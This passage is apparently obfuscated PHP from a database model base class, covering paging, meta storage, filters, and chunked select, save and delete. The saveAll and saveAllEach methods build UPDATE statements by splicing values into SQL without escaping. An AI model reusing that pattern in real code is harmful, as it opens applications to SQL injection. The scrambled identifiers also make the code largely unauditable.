$GLOBALS[$çù§ñÒş[7]][$çù§ñÒş[440]] : !1; $GLOBALS[$çù§ñÒş[7]][$çù§ñÒş[451]] = !1; $GLOBALS[$çù§ñÒş[7]][$çù§ñÒş[440]] = !1; } protected function selectPageRestore() { $ßªÎÃ‘ =& $_SERVER[Ò°Ì”İ•]; if (!isset($GLOBALS[$ßªÎÃ‘[450]])) { return; } $GLOBALS[$ßªÎÃ‘[7]][$ßªÎÃ‘[451]] = $GLOBALS[$ßªÎÃ‘[450]]; $GLOBALS[$ßªÎÃ‘[7]][$ßªÎÃ‘[440]] = $GLOBALS[$ßªÎÃ‘[452]]; if ($GLOBALS[$ßªÎÃ‘[7]][$ßªÎÃ‘[451]] === !1) { unset($GLOBALS[$ßªÎÃ‘[7]][$ßªÎÃ‘[451]]); } if ($GLOBALS[$ßªÎÃ‘[7]][$ßªÎÃ‘[440]] === !1) { unset($GLOBALS[$ßªÎÃ‘[7]][$ßªÎÃ‘[440]]); } unset($GLOBALS[$ßªÎÃ‘[450]]); unset($GLOBALS[$ßªÎÃ‘[452]]); } protected function selectPage($Í¤ÆõÂ« = 200, $±È½Ê˜¶ = 1) { $îøä•ÚÚ =& $_SERVER[Ò°Ì”İ•]; global $in; $ğÔü¸÷” = $this->optionsValue(); $â³€Áâ™ = 50000; $Í¤ÆõÂ« = isset($in[$îøä•ÚÚ[451]]) && $in[$îøä•ÚÚ[451]] ? $in[$îøä•ÚÚ[451]] : $Í¤ÆõÂ«; if ($Í¤ÆõÂ« === -1) { $in[$îøä•ÚÚ[451]] = !1; $â³€Áâ™ = 100000000; $Í¤ÆõÂ« = $â³€Áâ™; } $Ü˜•Éãˆ = $ğÔü¸÷”; $Ü˜•Éãˆ[$îøä•ÚÚ[453]] = array(); $Í¤ÆõÂ« = intval($Í¤ÆõÂ«); $Í¤ÆõÂ« = $Í¤ÆõÂ« <= 5 ? 5 : ($Í¤ÆõÂ« >= $â³€Áâ™ ? $â³€Áâ™ : $Í¤ÆõÂ«); $±È½Ê˜¶ = intval(isset($in[$îøä•ÚÚ[440]]) && $in[$îøä•ÚÚ[440]] ? $in[$îøä•ÚÚ[440]] : $±È½Ê˜¶); $±È½Ê˜¶ = $±È½Ê˜¶ <= 1 ? 1 : $±È½Ê˜¶; $³åóãô† = array(); $÷ÃÙÛ§ö = 1; if ($±È½Ê˜¶ == 1 && $÷ÃÙÛ§ö) { $this->optionsValue($ğÔü¸÷”); $³åóãô† = $this->page($±È½Ê˜¶, $Í¤ÆõÂ«)->select(); $Úê¢„ = is_array($³åóãô†) ? count($³åóãô†) : 0; if ($Úê¢„ < $Í¤ÆõÂ«) { $„ãÅÎƒ = 1; } else { $this->optionsValue($Ü˜•Éãˆ); $Úê¢„ = intval($this->count()); $„ãÅÎƒ = ceil($Úê¢„ / $Í¤ÆõÂ«); } } else { $this->optionsValue($Ü˜•Éãˆ); $Úê¢„ = intval($this->count()); $„ãÅÎƒ = ceil($Úê¢„ / $Í¤ÆõÂ«); $±È½Ê˜¶ = $±È½Ê˜¶ >= $„ãÅÎƒ ? $„ãÅÎƒ : $±È½Ê˜¶; $this->optionsValue($ğÔü¸÷”); $³åóãô† = $this->page($±È½Ê˜¶, $Í¤ÆõÂ«)->select(); } if (!is_array($³åóãô†)) { $³åóãô† = array(); } if ($„ãÅÎƒ == 1) { $Úê¢„ = count($³åóãô†); } $Ãïêìåµ = array($îøä•ÚÚ[454] => array($îøä•ÚÚ[455] => $Úê¢„, $îøä•ÚÚ[451] => $Í¤ÆõÂ«, $îøä•ÚÚ[440] => $±È½Ê˜¶, $îøä•ÚÚ[456] => $„ãÅÎƒ), $îøä•ÚÚ[457] => $³åóãô†); return $Ãïêìåµ; } protected function checkLength($¯‡³©÷, $ğÈÏÜÒú = 0, $¡Ï›´Øí = '') { $ò‘©»Ç· =& $_SERVER[Ò°Ì”İ•]; $ğÈÏÜÒú = $ğÈÏÜÒú ? $ğÈÏÜÒú : 65536; if (!$¯‡³©÷ || strlen($¯‡³©÷) < $ğÈÏÜÒú) { return; } $¡Ï›´Øí = $¡Ï›´Øí ? $¡Ï›´Øí . $ò‘©»Ç·[85] : $ò‘©»Ç·[12]; show_json($¡Ï›´Øí . LNG($ò‘©»Ç·[458]) . "\x28{$ğÈÏÜÒú}\51", !1); } protected function metaSet($« Ó“…÷, $Ö‚Ğ›Çã = null, $Ğ“·¨øƒ = null) { $è¹ö¿ÜÛ =& $_SERVER[Ò°Ì”İ•]; if (!$this->tableMeta || !$« Ó“…÷) { return !1; } $åÂìı­º = $this->tableMeta[$è¹ö¿ÜÛ[459]]; $Ø‹¢÷½› = $this->tableMeta[$è¹ö¿ÜÛ[460]]; $¼½î«ÛÓ = Model($Ø‹¢÷½›); $²…úé¦ñ = array($åÂìı­º => $« Ó“…÷, $è¹ö¿ÜÛ[461] => $Ö‚Ğ›Çã); if (is_null($Ö‚Ğ›Çã)) { return $¼½î«ÛÓ->where(array($åÂìı­º => $« Ó“…÷))->delete(); } if (is_null($Ğ“·¨øƒ) && is_string($Ö‚Ğ›Çã)) { return $¼½î«ÛÓ->where($²…úé¦ñ)->delete(); } $óë ©ªŒ = is_array($Ö‚Ğ›Çã) ? $Ö‚Ğ›Çã : array(); if (is_string($Ö‚Ğ›Çã)) { $óë ©ªŒ[$Ö‚Ğ›Çã] = $Ğ“·¨øƒ; } $ıÍ«ì÷ = array(); foreach ($óë ©ªŒ as $–ÚŞš×ù => $á²ËÏ¤¼) { if (is_null($á²ËÏ¤¼) && is_string($–ÚŞš×ù)) { $¼½î«ÛÓ->where(array($åÂìı­º => $« Ó“…÷, $è¹ö¿ÜÛ[461] => $–ÚŞš×ù))->delete(); continue; } $this->checkLength($á²ËÏ¤¼, !1, $Ø‹¢÷½› . $è¹ö¿ÜÛ[4] . $–ÚŞš×ù); $ıÍ«ì÷[] = array($åÂìı­º => $« Ó“…÷, $è¹ö¿ÜÛ[108] => $–ÚŞš×ù, $è¹ö¿ÜÛ[462] => $á²ËÏ¤¼); } $Êá¬«–¼ = $è¹ö¿ÜÛ[463] . $Ø‹¢÷½›; CacheLock::lock($Êá¬«–¼); $¼½î«ÛÓ->where(array($åÂìı­º => $« Ó“…÷))->addAll($ıÍ«ì÷, array(), !0); CacheLock::unlock($Êá¬«–¼); return !0; } public function metaGet($»ûˆ¡ÀÅ, $öõ‡´Ë = false) { $õ½‰²Àˆ =& $_SERVER[Ò°Ì”İ•]; if (!$this->tableMeta) { return array(); } $·Ú£Ô‡ç = $this->tableMeta[$õ½‰²Àˆ[459]]; $áÖ©ûı = Model($this->tableMeta[$õ½‰²Àˆ[460]]); if ($öõ‡´Ë) { $®’½Í¨¶ = array($·Ú£Ô‡ç => $»ûˆ¡ÀÅ, $õ½‰²Àˆ[108] => $öõ‡´Ë); return $áÖ©ûı->where($®’½Í¨¶)->getField($õ½‰²Àˆ[462]); } $®’½Í¨¶ = array($·Ú£Ô‡ç => $»ûˆ¡ÀÅ); $è¦È¬½ü = $áÖ©ûı->field($õ½‰²Àˆ[464])->where($®’½Í¨¶)->select(); $è¦È¬½ü = array_to_keyvalue($è¦È¬½ü, $õ½‰²Àˆ[108], $õ½‰²Àˆ[462]); return $è¦È¬½ü; } private function checkDataAutoHas($û»Öš) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $Äá›ïÎ) { if (in_array($û»Öš, explode($_SERVER[Ò°Ì”İ•][50], $Äá›ïÎ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$ØÁ©¼Ì, $÷çºÍ¤²) { $ê‘«¹Ç² =& $_SERVER[Ò°Ì”İ•]; if (!is_array($ØÁ©¼Ì)) { return; } foreach ($this->dataAuto as $ØÓ•ÅÏÒ) { $¾—¡òå¤ = $ØÓ•ÅÏÒ[0]; if (!in_array($÷çºÍ¤², explode($ê‘«¹Ç²[50], $ØÓ•ÅÏÒ[2]))) { continue; } switch (trim($ØÓ•ÅÏÒ[3])) { case $ê‘«¹Ç²[408]: case $ê‘«¹Ç²[409]: $§ÂğĞûÊ = $ØÓ•ÅÏÒ[1]; $Œ„°‰›ğ = isset($ØÓ•ÅÏÒ[4]) ? (array) $ØÓ•ÅÏÒ[4] : array(); if ($§ÂğĞûÊ == $ê‘«¹Ç²[217] && array_key_exists($¾—¡òå¤, $ØÁ©¼Ì)) { if (!$ØÁ©¼Ì[$¾—¡òå¤]) { unset($ØÁ©¼Ì[$¾—¡òå¤]); } break; } if (isset($ØÁ©¼Ì[$¾—¡òå¤])) { array_unshift($Œ„°‰›ğ, $ØÁ©¼Ì[$¾—¡òå¤]); } if ($ê‘«¹Ç²[408] == $ØÓ•ÅÏÒ[3]) { $ØÁ©¼Ì[$¾—¡òå¤] = call_user_func_array($§ÂğĞûÊ, $Œ„°‰›ğ); } else { $ØÁ©¼Ì[$¾—¡òå¤] = call_user_func_array(array(&$this, $§ÂğĞûÊ), $Œ„°‰›ğ); } break; case $ê‘«¹Ç²[359]: if (isset($ØÁ©¼Ì[$¾—¡òå¤]) && $ØÁ©¼Ì[$¾—¡òå¤]) { $ØÁ©¼Ì[$¾—¡òå¤] = call_user_func_array(array(&$this, $ØÓ•ÅÏÒ[1]), array($ØÁ©¼Ì[$¾—¡òå¤])); } break; case $ê‘«¹Ç²[362]: $ØÁ©¼Ì[$¾—¡òå¤] = $ØÁ©¼Ì[$ØÓ•ÅÏÒ[1]]; break; case $ê‘«¹Ç²[381]: if (isset($ØÁ©¼Ì[$¾—¡òå¤]) && !is_string($ØÁ©¼Ì[$¾—¡òå¤])) { $ØÁ©¼Ì[$¾—¡òå¤] = json_encode_force($ØÁ©¼Ì[$¾—¡òå¤]); } break; case $ê‘«¹Ç²[410]: if ($ØÁ©¼Ì[$¾—¡òå¤] === $ê‘«¹Ç²[12]) { unset($ØÁ©¼Ì[$¾—¡òå¤]); } break; case $ê‘«¹Ç²[411]: $ØÁ©¼Ì[$¾—¡òå¤] = $ØÓ•ÅÏÒ[1]; default: break; } } if ($÷çºÍ¤² == $ê‘«¹Ç²[442]) { $Ö¤ÎÚËã = strtolower($this->db->getDbType()); if (strpos($Ö¤ÎÚËã, $ê‘«¹Ç²[13]) !== 0) { return; } $¼Ÿ¯¶‰ = $this->field(!0)->fields; $Ê¼ë’…í = $¼Ÿ¯¶‰[$ê‘«¹Ç²[341]]; if (isset($¼Ÿ¯¶‰[$ê‘«¹Ç²[340]])) { unset($Ê¼ë’…í[$¼Ÿ¯¶‰[$ê‘«¹Ç²[340]]]); } foreach ($Ê¼ë’…í as $¯—˜¡˜º => $÷çºÍ¤²) { if (!isset($ØÁ©¼Ì[$¯—˜¡˜º])) { $ØÁ©¼Ì[$¯—˜¡˜º] = $ê‘«¹Ç²[12]; } } } } private function dataAfterFilter(&$æ£öŠ½µ) { $¨Ì¦ÒÑÍ =& $_SERVER[Ò°Ì”İ•]; foreach ($this->dataAuto as $³‰êÔò) { $Ö§İÛû = $³‰êÔò[0]; if (!isset($æ£öŠ½µ[$Ö§İÛû])) { continue; } if (!in_array($¨Ì¦ÒÑÍ[444], explode($¨Ì¦ÒÑÍ[50], $³‰êÔò[2]))) { continue; } switch (trim($³‰êÔò[3])) { case $¨Ì¦ÒÑÍ[408]: case $¨Ì¦ÒÑÍ[409]: $‡±ìëÙ = isset($³‰êÔò[4]) ? (array) $³‰êÔò[4] : array(); array_unshift($‡±ìëÙ, $æ£öŠ½µ[$Ö§İÛû]); if (isset($³‰êÔò[4]) && $³‰êÔò[4] == $¨Ì¦ÒÑÍ[465]) { $‡±ìëÙ = array($æ£öŠ½µ[$Ö§İÛû]); } if ($¨Ì¦ÒÑÍ[408] == $³‰êÔò[3]) { $æ£öŠ½µ[$Ö§İÛû] = call_user_func_array($³‰êÔò[1], $‡±ìëÙ); } else { $æ£öŠ½µ[$Ö§İÛû] = call_user_func_array(array(&$this, $³‰êÔò[1]), $‡±ìëÙ); } break; case $¨Ì¦ÒÑÍ[359]: if (isset($æ£öŠ½µ[$Ö§İÛû]) && $æ£öŠ½µ[$Ö§İÛû]) { $æ£öŠ½µ[$Ö§İÛû] = call_user_func_array(array(&$this, $³‰êÔò[1]), array($æ£öŠ½µ[$Ö§İÛû])); } break; case $¨Ì¦ÒÑÍ[362]: $æ£öŠ½µ[$Ö§İÛû] = $æ£öŠ½µ[$³‰êÔò[1]]; break; case $¨Ì¦ÒÑÍ[381]: $êÑÀÙ»Ç = $æ£öŠ½µ[$Ö§İÛû]; $æ£öŠ½µ[$Ö§İÛû] = json_decode($êÑÀÙ»Ç, !0); if (is_null($æ£öŠ½µ[$Ö§İÛû])) { $æ£öŠ½µ[$Ö§İÛû] = $êÑÀÙ»Ç; } break; case $¨Ì¦ÒÑÍ[410]: if ($æ£öŠ½µ[$Ö§İÛû] === $¨Ì¦ÒÑÍ[12]) { unset($æ£öŠ½µ[$Ö§İÛû]); } break; case $¨Ì¦ÒÑÍ[411]: $æ£öŠ½µ[$Ö§İÛû] = $³‰êÔò[1]; break; default: break; } } } public function saveAll($ÍÅõÑ’) { $Ä§î¸˜ =& $_SERVER[Ò°Ì”İ•]; $Ö©Ğ¨Öñ = $this->tablePrefix . $this->tableName; $äıüŒ¢Ã = self::SQL_WHERE_IN_CHUNK; $ÍÅõÑ’ = is_array($ÍÅõÑ’) ? $ÍÅõÑ’ : array(); $ÎÈˆ³ì‹ = $Ä§î¸˜[466]; $·ïî¢Ü¥ = 0; $¸è»ËÎ = array(); $‡²÷Ÿ”» = count($ÍÅõÑ’); for ($Š—Øšû¨ = 0; $Š—Øšû¨ < $‡²÷Ÿ”»; $Š—Øšû¨++) { $§áú±›û = $ÍÅõÑ’[$Š—Øšû¨]; if (!is_array($§áú±›û) || count($§áú±›û) != 4) { continue; } $÷£§—”ß = "\125\x50\x44\x41\124\105\x20\x60{$Ö©Ğ¨Öñ}\140\40\x53\x45\x54\40{$§áú±›û[2]}\x20\75\x20\x43\x41\123\105\40{$§áú±›û[0]}\x20\12"; if ($·ïî¢Ü¥ == 0) { $ÎÈˆ³ì‹ = $÷£§—”ß; } $¸è»ËÎ[] = $Ä§î¸˜[132] . $§áú±›û[1] . $Ä§î¸˜[132]; $·ïî¢Ü¥++; $ÎÈˆ³ì‹ .= "\40\127\x48\x45\x4e\x20\47{$§áú±›û[1]}\x27\x20\124\110\105\116\x20\x27{$§áú±›û[3]}\47\x20\12"; if ($·ïî¢Ü¥ == $äıüŒ¢Ã || $Š—Øšû¨ == $‡²÷Ÿ”» - 1) { $…æÔ¡ùê = implode($Ä§î¸˜[50], $¸è»ËÎ); $ÎÈˆ³ì‹ .= "\40\105\x4e\104\x20\x20\127\x48\105\x52\x45\40{$§áú±›û[0]}\40\111\116\x20\x28{$…æÔ¡ùê}\51\40"; $this->execute($ÎÈˆ³ì‹); $·ïî¢Ü¥ = 0; $ÎÈˆ³ì‹ = $÷£§—”ß; $this->chunkEventCheck(count($¸è»ËÎ)); $¸è»ËÎ = array(); } } $this->chunkEventSet(); } public function saveAllEach($Êé¾¼ÛÖ) { $à‡¬ˆ½² =& $_SERVER[Ò°Ì”İ•]; $‹Œœœ©Ô = $this->tablePrefix . $this->tableName; foreach ($Êé¾¼ÛÖ as $Üí¶óââ) { if (!is_array($Üí¶óââ) || count($Üí¶óââ) != 4) { continue; } $­’¯şÖ = $Üí¶óââ[0] . $à‡¬ˆ½²[467] . $Üí¶óââ[1] . $à‡¬ˆ½²[132]; $Ÿó­Ó±Š = $Üí¶óââ[2] . $à‡¬ˆ½²[467] . $Üí¶óââ[3] . $à‡¬ˆ½²[132]; $Àëù•Øˆ = "\165\160\144\x61\x74\x65\40{$‹Œœœ©Ô}\40\163\145\164\40{$Ÿó­Ó±Š}\x20\167\150\145\x72\x65\40{$­’¯şÖ}\73"; $this->execute($Àëù•Øˆ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($Åƒ§¿îş = false, $›…·åëŠ = false) { $this->_chunkEvent = $Åƒ§¿îş; $this->_chunkEventParam = $›…·åëŠ; } private function chunkEventCheck($·¨™úğ˜) { if (!$this->_chunkEvent) { return; } $²Ûœâçµ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $²Ûœâçµ[$_SERVER[Ò°Ì”İ•][468]] = $·¨™úğ˜; Hook::trigger($this->_chunkEvent, $²Ûœâçµ); } public function addAll($¿½é˜“ö, $İ—ÅóÁç = array(), $Ê“Ã‹š = false) { $¼¢ˆ›Âë =& $_SERVER[Ò°Ì”İ•]; ignore_timeout(); $»ªã¢¼ = self::SQL_WHERE_IN_CHUNK; if (empty($¿½é˜“ö)) { $this->error = think_lang($¼¢ˆ›Âë[360]); return !1; } $İ—ÅóÁç = $this->_parseOptions($İ—ÅóÁç); foreach ($¿½é˜“ö as $…ûºÆìİ => $ÄñØàÚë) { $¿½é˜“ö[$…ûºÆìİ] = $this->_facade($ÄñØàÚë); $this->_beforeInsert($¿½é˜“ö[$…ûºÆìİ], $İ—ÅóÁç); } if (method_exists($this->db, $¼¢ˆ›Âë[361])) { for ($¸ûõÛÃ = 0; $¸ûõÛÃ < count($¿½é˜“ö); $¸ûõÛÃ += $»ªã¢¼) { $‰ûÁ§ì = array_slice($¿½é˜“ö, $¸ûõÛÃ, $»ªã¢¼); if (!is_array($‰ûÁ§ì) || count($‰ûÁ§ì) == 0) { break; } $ò™À±ò³ = $this->db->insertAll($‰ûÁ§ì, $İ—ÅóÁç, $Ê“Ã‹š); $this->chunkEventCheck(count($‰ûÁ§ì)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($¿½é˜“ö as $…ûºÆìİ => $ÄñØàÚë) { $ò™À±ò³ = $this->db->insert($ÄñØàÚë, $İ—ÅóÁç, $Ê“Ã‹š); } $this->commit(); } if (!1 !== $ò™À±ò³) { $ëÀ™²éô = $this->getLastInsID(); if ($ëÀ™²éô) { return $ëÀ™²éô; } } return $ò™À±ò³; } public function save($ØºÔËÚ» = '', $Æ¬ñà› = array()) { $Ôğí¦øı =& $_SERVER[Ò°Ì”İ•]; $ë±û‡£ä = self::SQL_WHERE_IN_CHUNK; $Ë¹ü€ÇĞ = $this->optionsValue(); $ºâ½üå€ = $this->findWhereField($Ë¹ü€ÇĞ); if (!$ºâ½üå€) { return parent::save($ØºÔËÚ», $Æ¬ñà›); } $½Ğªïâ¦ = 0; $Ïã”Æ = $Ë¹ü€ÇĞ[$Ôğí¦øı[364]][$ºâ½üå€][1]; $Ïã”Æ = is_array($Ïã”Æ) ? $Ïã”Æ : array(); $ğÓÂÚµ = count($Ïã”Æ); for ($¸ë°÷ = 0; $¸ë°÷ < $ğÓÂÚµ; $¸ë°÷ += $ë±û‡£ä) { $ãÒ¯¥¹ü = array_slice($Ïã”Æ, $¸ë°÷, $ë±û‡£ä); if (!is_array($ãÒ¯¥¹ü) || count($ãÒ¯¥¹ü) == 0) { break; } $Ë¹ü€ÇĞ[$Ôğí¦øı[364]][$ºâ½üå€][1] = $ãÒ¯¥¹ü; $this->optionsValue($Ë¹ü€ÇĞ); $½Ğªïâ¦ += parent::save($ØºÔËÚ», $Æ¬ñà›); $this->chunkEventCheck(count($ãÒ¯¥¹ü)); } $this->chunkEventSet(); return $½Ğªïâ¦; } public function add($Œ°àìÙ = '', $Òßş™‚ = array(), $¯Óó“Õ¿ = false) { if ($this->addTaskStatus && is_array($Œ°àìÙ)) { $this->addTaskData[] = $Œ°àìÙ; return; } return parent::add($Œ°àìÙ, $Òßş™‚, $¯Óó“Õ¿); } public function parseWhereLike($†€Ş–·™, $ĞÓÌµş÷ = '', $œÄ‘‘ì = false, &$ë­­—ÕØ = false) { $œ±Ë‡›Ï =& $_SERVER[Ò°Ì”İ•]; $¦Šªò˜¢ = $GLOBALS[$œ±Ë‡›Ï[6]][$œ±Ë‡›Ï[469]]; if (!$¦Šªò˜¢[$œ±Ë‡›Ï[470]]) { return $†€Ş–·™; } if (!is_array($†€Ş–·™)) { return $†€Ş–·™; } $ç¢¿Ò¤ = array(); $õı±©Â = 0; foreach ($†€Ş–·™ as $­ª«–œ¾ => $ıªŸİÈ½) { if (is_array($ıªŸİÈ½) && count($ıªŸİÈ½) == 2 && $ıªŸİÈ½[0] == $œ±Ë‡›Ï[471] && is_string($ıªŸİÈ½[1]) && substr($ıªŸİÈ½[1], 0, 1) == $œ±Ë‡›Ï[472] && substr($ıªŸİÈ½[1], strlen($ıªŸİÈ½[1]) - 1, 1) == $œ±Ë‡›Ï[472]) { $ë­­—ÕØ = !0; $¼¯óŸÙ­ = is_string($­ª«–œ¾) ? $­ª«–œ¾ : $ĞÓÌµş÷; $¾›û”Í = substr($ıªŸİÈ½[1], 1, strlen($ıªŸİÈ½[1]) - 2); $¾›û”Í = $this->db->escapeString($¾›û”Í); if (!strpos($¼¯óŸÙ­, $œ±Ë‡›Ï[10])) { $¼¯óŸÙ­ = $œ±Ë‡›Ï[473] . $¼¯óŸÙ­ . $œ±Ë‡›Ï[473]; } $»ÉéÇ”ß = $œ±Ë‡›Ï[233] . $¾›û”Í . $œ±Ë‡›Ï[233]; $¾›û”Í = str_replace(array($œ±Ë‡›Ï[10], $œ±Ë‡›Ï[474], $œ±Ë‡›Ï[11]), $œ±Ë‡›Ï[475], $¾›û”Í); if ($¦Šªò˜¢[$œ±Ë‡›Ï[476]]) { $»ÉéÇ”ß = $œ±Ë‡›Ï[477] . $¾›û”Í . $œ±Ë‡›Ï[478]; if ($¦Šªò˜¢[$œ±Ë‡›Ï[479]]) { $»ÉéÇ”ß = $œ±Ë‡›Ï[478] . $¾›û”Í . $œ±Ë‡›Ï[477]; } } $ç¢¿Ò¤[$õı±©Â] = $œ±Ë‡›Ï[480] . $¼¯óŸÙ­ . $œ±Ë‡›Ï[481] . $»ÉéÇ”ß . $œ±Ë‡›Ï[482]; $õı±©Â++; continue; } if (is_array($ıªŸİÈ½)) { $ĞÓÌµş÷ = is_string($­ª«–œ¾) ? $­ª«–œ¾ : $ĞÓÌµş÷; $ıªŸİÈ½ = $this->parseWhereLike($ıªŸİÈ½, $ĞÓÌµş÷, !0, $ë­­—ÕØ); } if (is_numeric($­ª«–œ¾)) { $ç¢¿Ò¤[$õı±©Â] = $ıªŸİÈ½; $õı±©Â++; } else { $ç¢¿Ò¤[$­ª«–œ¾] = $ıªŸİÈ½; } } if ($ë­­—ÕØ && !$œÄ‘‘ì) { } return $ç¢¿Ò¤; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($«Û¬Ë‹ = array()) { $‡§€™ëÇ =& $_SERVER[Ò°Ì”İ•]; $˜şäÁÄ = self::SQL_WHERE_IN_CHUNK; $æÙìÓš¬ = $this->optionsValue(); $¼†Ò™…° = $this->findWhereField($æÙìÓš¬); if (!$¼†Ò™…° || isset($æÙìÓš¬[$‡§€™ëÇ[379]]) || isset($æÙìÓš¬[$‡§€™ëÇ[440]])) { return parent::select($«Û¬Ë‹); } $°à¢²âÅ = $æÙìÓš¬[$‡§€™ëÇ[364]][$¼†Ò™…°][1]; $°à¢²âÅ = is_array($°à¢²âÅ) ? $°à¢²âÅ : array(); $ùã‚ïÔİ = null; for ($àÈ¾Îª¼ = 0; $àÈ¾Îª¼ < count($°à¢²âÅ); $àÈ¾Îª¼ += $˜şäÁÄ) { $÷øÏ„õº = array_slice($°à¢²âÅ, $àÈ¾Îª¼, $˜şäÁÄ); if (!is_array($÷øÏ„õº) || count($÷øÏ„õº) == 0) { break; } $æÙìÓš¬[$‡§€™ëÇ[364]][$¼†Ò™…°][1] = $÷øÏ„õº; $this->optionsValue($æÙìÓš¬); $ò°ƒİö = parent::select($«Û¬Ë‹); if (!$ò°ƒİö) { continue; } $ùã‚ïÔİ = is_array($ùã‚ïÔİ) ? $ùã‚ïÔİ : array(); $ùã‚ïÔİ = array_merge($ùã‚ïÔİ, $ò°ƒİö); } return $ùã‚ïÔİ; } public function delete($ ç¹ùÓÎ = array()) { $â†ñÍ£ =& $_SERVER[Ò°Ì”İ•]; $£×á”¸´ = self::SQL_WHERE_IN_CHUNK; $ı‡ßµ´ = $this->optionsValue(); $Æ«ô½ÜÛ = $this->findWhereField($ı‡ßµ´); if (!$Æ«ô½ÜÛ) { return parent::delete($ ç¹ùÓÎ); } $ß»‹ÚÇ· = 0; $“Å»¿š = $ı‡ßµ´[$â†ñÍ£[364]][$Æ«ô½ÜÛ][1]; $“Å»¿š = is_array($“Å»¿š) ? $“Å»¿š : array(); for ($•¿Õ§ö = 0; $•¿Õ§ö < count($“Å»¿š); $•¿Õ§ö += $£×á”¸´) { $±¾¤Ó„„ = array_slice($“Å»¿š, $•¿Õ§ö, $£×á”¸´); if (!is_array($±¾¤Ó„„) || count($±¾¤Ó„„) == 0) { break; } $ı‡ßµ´[$â†ñÍ£[364]][$Æ«ô½ÜÛ][1] = $±¾¤Ó„„; $this->optionsValue($ı‡ßµ´); $ß»‹ÚÇ· += parent::delete($ ç¹ùÓÎ); } return $ß»‹ÚÇ·; } private function findWhereField($ı—¯Ôœ) { $ı´¬Øï½ =& $_SERVER[Ò°Ì”İ•]; $ÁØ®¤²˜ = self::SQL_WHERE_IN_CHUNK; if (!is_array($ı—¯Ôœ) || !is_array($ı—¯Ôœ[$ı´¬Øï½[364]])) { return !1; } foreach ($ı—¯Ôœ[$ı´¬Øï½[364]] as $í¬­ºµ => $ª“®‘ë¹) { if (is_array($ª“®‘ë¹) && isset($ª“®‘ë¹[0]) && is_string($ª“®‘ë¹[0]) && strtolower($ª“®‘ë¹[0]) == $ı´¬Øï½[7] && is_array($ª“®‘ë¹[1]) && count($ª“®‘ë¹[1]) > $ÁØ®¤²˜) { ignore_timeout(); return $í¬­ºµ; } } return !1; } public function setMasterDB($•Ç”¼ê• = true) { think_config($_SERVER[Ò°Ì”İ•][483], $•Ç”¼ê•); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\163\164\145\x6d\x4f\160\x74\x69\x6f\x6e"; public $field = array(); public function listData($÷¡ë°¿í = false, $ªÊúŒÊ× = "\155\157\144\151\x66\171\124\151\155\145", $ôíÑÙ’¹ = false) { $¥…³µ€ = Model($this->modelType)->get(!1, $this->optionType, !0); $Ï½ˆ…Õ‚ = array_values($¥…³µ€); if ($Ï½ˆ…Õ‚ && $Ï½ˆ…Õ‚[0] && !is_array($Ï½ˆ…Õ‚[0])) { Model($this->modelType)->cacheRemove($this->optionType); $¥…³µ€ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$¥…³µ€) { return $÷¡ë°¿í ? null : array(); } if (!$÷¡ë°¿í) { $¥…³µ€ = array_filter(array_values($¥…³µ€)); return array_sort_by($¥…³µ€, $ªÊúŒÊ×, $ôíÑÙ’¹); } return $¥…³µ€[$_SERVER[Ò°Ì”İ•][484] . $÷¡ë°¿í]; } public function insert($ãÓØŸ•Ÿ) { $€Ùµª¸ =& $_SERVER[Ò°Ì”İ•]; $ãÓØŸ•Ÿ = array_field_key($ãÓØŸ•Ÿ, $this->field); $ÀÓç©ÕÙ = Model($this->modelType)->get($€Ùµª¸[485], $this->optionType . $€Ùµª¸[486]); $ÀÓç©ÕÙ = $ÀÓç©ÕÙ ? $ÀÓç©ÕÙ : 0; $ãÓØŸ•Ÿ[$€Ùµª¸[487]] = ++$ÀÓç©ÕÙ; $ãÓØŸ•Ÿ[$€Ùµª¸[244]] = time(); $ãÓØŸ•Ÿ[$€Ùµª¸[99]] = time(); Model($this->modelType)->set($€Ùµª¸[485], $ÀÓç©ÕÙ, $this->optionType . $€Ùµª¸[486]); Model($this->modelType)->set($€Ùµª¸[484] . $ÀÓç©ÕÙ, $ãÓØŸ•Ÿ, $this->optionType); return $ÀÓç©ÕÙ; } public function update($§®áêÍ, $­Ø§•ò) { $Î‚¾äÙ½ =& $_SERVER[Ò°Ì”İ•]; $­Ø§•ò = array_field_key($­Ø§•ò, $this->field); $ÏÖñ®â = $this->listData($§®áêÍ); if (!$ÏÖñ®â || !$§®áêÍ) { return !1; } $­Ø§•ò = array_merge($ÏÖñ®â, $­Ø§•ò); $­Ø§•ò[$Î‚¾äÙ½[99]] = time(); return Model($this->modelType)->set($Î‚¾äÙ½[484] . $§®áêÍ, $­Ø§•ò, $this->optionType); } public function remove($Ş•Çş¥Á) { if (!$Ş•Çş¥Á) { return !1; } return Model($this->modelType)->remove($_SERVER[Ò°Ì”İ•][484] . $Ş•Çş¥Á, $this->optionType); } public function clear() { $Îï¯ùÖÁ =& $_SERVER[Ò°Ì”İ•]; Model($this->modelType)->remove($Îï¯ùÖÁ[485], $this->optionType . $Îï¯ùÖÁ[486]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($®ÍîÎÖú, $§¢á‰Å) { if (!$§¢á‰Å) { return !1; } $éù®‡†© = $this->listData(); $éù®‡†© = array_to_keyvalue($éù®‡†©, $®ÍîÎÖú); return isset($éù®‡†©[$§¢á‰Å]) ? $éù®‡†©[$§¢á‰Å] : !1; } public function findByName($¤ˆˆÈˆû) { return $this->findByKey($_SERVER[Ò°Ì”İ•][32], $¤ˆˆÈˆû); } protected function resetData($æ‡´Å£ï) { $£¢èû´È =& $_SERVER[Ò°Ì”İ•]; $æ‡´Å£ï = is_array($æ‡´Å£ï) ? $æ‡´Å£ï : array(); $¹—¡ôñ± = array(); for ($§¾×á¦ = 0; $§¾×á¦ < count($æ‡´Å£ï); $§¾×á¦++) { $¹—¡ôñ±[$£¢èû´È[484] . 